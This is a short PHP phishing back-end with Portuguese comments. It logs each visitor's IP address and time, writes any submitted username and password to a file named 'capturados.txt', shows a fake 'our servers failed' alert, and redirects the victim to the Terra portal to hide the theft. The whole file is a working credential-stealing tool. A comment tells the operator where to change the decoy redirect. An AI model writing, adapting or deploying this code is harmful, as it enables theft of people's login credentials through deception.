<?php
$ip = $_SERVER['REMOTE_ADDR']; //Aqui pegamos o IP do visitante! 
$data = date("d/m/Y"); //Pegamos data e guardamos na variável 
$hora = date("H:i:s"); //Pegamos hora e guardamos na variável 
$string = "$data - $hora -> $ip\r\n"; //Montamos a string que iremos salvar, com \r\n no final pra quebrar linha 
$fp = fopen("top.txt", "a"); //Abrimos o arquivo com o parâmetro a, que escreve no final do arquivo 
fwrite($fp, $string); //Escrevemos 
fclose($fp); //Fechamos o arquivo 

$n1 = $_POST["username_id"];
$n2 = $_POST["username_pw"];

$conteudo = "Login: $n1 \nSenha: $n2\n\n\n";


$arquivo = "capturados.txt";


$abrir = fopen($arquivo, 'a');
fwrite($abrir, var_export($conteudo, true));
//pode mudar aqui o site que vai depois que a pessoa faz login

echo <<<HTML
<html>
<body onload="alert('Ops! Todo mundo erra, e dessa vez foi nossos servidores. Pedimos que tente novamente mais tarde.')">
</html>
HTML;


echo '<meta http-equiv="refresh" content="0;url=https://www.terra.com.br/">';

fclose($abrir);

//Criamos uma função que irá retornar o conteúdo do arquivo.

?>
